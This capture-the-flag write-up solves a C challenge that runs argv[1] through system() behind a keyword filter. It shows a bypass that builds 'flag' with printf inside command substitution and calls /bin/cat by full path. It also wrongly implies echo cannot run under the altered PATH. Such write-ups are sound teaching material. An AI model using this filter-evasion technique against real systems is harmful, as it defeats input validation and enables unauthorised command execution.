### Task

The challenge involves bypassing a filter in the provided C code to execute a command that reads the flag. The filter blocks certain keywords like `flag`, `sh`, and `tmp`, so we need to find a way to bypass it.

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd) {
    int r = 0;
    r += strstr(cmd, "flag") != 0;
    r += strstr(cmd, "sh") != 0;
    r += strstr(cmd, "tmp") != 0;
    return r;
}

int main(int argc, char* argv[], char** envp) {
    putenv("PATH=/thankyouverymuch");
    if (filter(argv[1])) return 0;
    system(argv[1]);
    return 0;
}
```

### Analysis

1. **Filter Function**:
   - The `filter` function checks if the input command contains the strings `flag`, `sh`, or `tmp`.
   - If any of these strings are found, the function returns a non-zero value, causing the program to exit without executing the command.

2. **Environment Manipulation**:
   - The `putenv("PATH=/thankyouverymuch");` line modifies the `PATH` environment variable, making it impossible to execute common commands like `echo` or `cat` directly.

3. **Command Execution**:
   - The program executes the command passed as `argv[1]` using `system(argv[1])`, but only if it passes the filter.

### Solution

To bypass the filter and execute a command that reads the flag, we can use the following techniques:

1. **String Concatenation**:
   - Use `printf` to construct the string `flag` without explicitly writing it. For example:
     ```bash
     printf "%s%s" "fl" "ag"
     ```

2. **Full Path to Commands**:
   - Since the `PATH` environment variable is modified, we need to use the full path to commands like `/bin/cat`.

3. **Command Substitution**:
   - Use `$(...)` to execute a command and substitute its output into the main command.


The final solution involves constructing a command that bypasses the filter and reads the flag:

```bash
./cmd1 '$(printf "/bin/cat ./%s%s" "fl" "ag")'
```

### Final Command

Run the following command to exploit the program and retrieve the flag:

```bash
./cmd1 '$(printf "/bin/cat ./%s%s" "fl" "ag")'
```
